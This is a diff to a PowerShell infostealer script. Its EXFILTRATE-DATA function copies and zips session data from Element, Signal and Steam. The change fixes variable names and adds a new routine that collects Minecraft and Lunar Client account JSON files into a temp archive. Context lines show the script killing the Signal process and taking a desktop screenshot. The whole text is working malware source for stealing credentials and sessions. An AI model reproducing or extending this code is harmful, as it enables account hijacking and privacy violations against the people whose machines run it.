@@ -1,4 +1,4 @@
-﻿$ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
+$ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
 $ProgressPreference = 'SilentlyContinue' # Hide all Progresses
 
 function CHECK_IF_ADMIN {
@@ -95,14 +95,14 @@ function EXFILTRATE-DATA {
         Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force
         Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
         Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
-        $signal_zip = "$env:localappdata\temp\element-session.zip"
-        Compress-Archive -Path $element_session -DestinationPath $signal_zip -CompressionLevel Fastest
+        $element_zip = "$env:localappdata\temp\element-session.zip"
+        Compress-Archive -Path $element_session -DestinationPath $element_zip -CompressionLevel Fastest
     }
     elementstealer 
 	
 	# Signal Session Stealer
     function signalstealer {
-        $processName = "Signal"
+        $processName = "signal"
         try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
         $signal_session = "$env:localappdata\temp\signal-session"
         New-Item -ItemType Directory -Force -Path $signal_session
@@ -133,6 +133,19 @@ function EXFILTRATE-DATA {
         Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
     }
     steamstealer 
+	
+	# Minecraft Session Stealer
+    function minecraftstealer {
+            $minecraft_session = "$env:localappdata\temp\minecraft-session"
+            New-Item -ItemType Directory -Force -Path $minecraft_session
+            $minecraftfolder1 = $env:appdata + "\.minecraft"
+    		$minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
+            Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
+            Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
+            $minecraft_zip = "$env:localappdata\temp\minecraft-session.zip"
+            Compress-Archive -Path $minecraft_session -DestinationPath $minecraft_zip -CompressionLevel Fastest
+    }
+    minecraftstealer 
 	
 	# Desktop screenshot
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
